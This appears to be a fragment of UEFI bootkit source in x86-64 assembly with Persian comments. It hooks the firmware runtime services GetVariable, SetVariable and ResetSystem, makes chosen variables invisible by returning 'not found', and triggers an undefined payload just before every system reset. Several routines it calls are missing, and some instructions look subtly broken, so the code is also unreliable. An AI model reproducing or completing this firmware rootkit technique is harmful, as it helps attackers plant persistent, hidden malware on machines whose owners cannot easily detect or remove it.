; رابط پیشرفته UEFI
section .text

; یافتن پروتکل EFI
efi_locate_protocol:
    ; rdi = GUID
    ; rsi = آدرس بازگردانی پروتکل
    mov rax, [EFI_SYSTEM_TABLE_BOOTSERVICES]
    mov rcx, rdi
    mov rdx, 0
    mov r8, rsi
    call [rax + EFI_LOCATE_PROTOCOL]
    ret

; جایگزینی خدمات رانتایم
hook_efi_runtime_services:
    mov rcx, [EFI_SYSTEM_TABLE_RUNTIMESERVICES]
    
    ; جایگزینی GetVariable
    mov rax, [rcx + EFI_GET_VARIABLE]
    mov [original_get_variable], rax
    mov [rcx + EFI_GET_VARIABLE], our_get_variable
    
    ; جایگزینی SetVariable
    mov rax, [rcx + EFI_SET_VARIABLE]
    mov [original_set_variable], rax
    mov [rcx + EFI_SET_VARIABLE], our_set_variable
    
    ; جایگزینی ResetSystem
    mov rax, [rcx + EFI_RESET_SYSTEM]
    mov [original_reset_system], rax
    mov [rcx + EFI_RESET_SYSTEM], our_reset_system
    ret

our_get_variable:
    ; مخفی‌سازی متغیرهای حیاتی
    mov rcx, [rsp+8]  ; VariableName
    mov rdx, [rsp+16] ; VendorGuid
    call is_hidden_variable
    test al, al
    jnz .hidden
    
    ; فراخوانی اصلی
    jmp [original_get_variable]
    
.hidden:
    ; برگرداندن خطا
    mov eax, EFI_NOT_FOUND
    ret

our_reset_system:
    ; فعال‌سازی پیلود قبل از ریست
    call activate_payload
    jmp [original_reset_system]
    